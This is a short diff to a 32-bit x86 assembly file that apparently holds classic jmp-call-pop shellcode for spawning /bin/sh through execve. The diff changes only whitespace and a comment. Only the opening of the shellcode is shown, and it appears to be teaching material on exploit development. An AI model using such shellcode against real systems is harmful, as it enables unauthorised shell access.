@@ -1,9 +1,9 @@
 BITS 32
 
   jmp short two
-  
+
 one:
-; int execve(const char *filename, char *const argv [], char *const envp[])
+; execve(const char *pathname, char *const argv [], char *const envp[])
   pop ebx               ; pop the string address from stack
   xor eax, eax          ; zero out eax
   mov [ebx+7], al       ; null terminate the /bin/sh string
